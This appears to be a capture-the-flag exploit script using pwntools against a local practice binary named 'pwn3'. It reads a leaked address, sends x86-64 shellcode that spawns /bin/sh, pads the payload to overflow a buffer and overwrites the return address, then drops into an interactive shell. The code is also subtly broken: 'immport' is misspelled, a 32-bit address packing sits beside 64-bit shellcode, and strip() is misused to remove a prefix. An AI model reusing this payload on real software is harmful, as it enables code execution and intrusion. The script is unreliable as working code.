#!/usr/bin/python3
from pwn immport *
target = process('./pwn3')
addr = target.recvline()
addr = addr.strip(b"Take this, you might need it on your journey ")
addr = addr.strip(b"!\n")
addr = int(addr, 16)
payload = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload += b"a"*(294+4 - len(payload)) + p32(addr)
target.send(payload)
target.interactive()
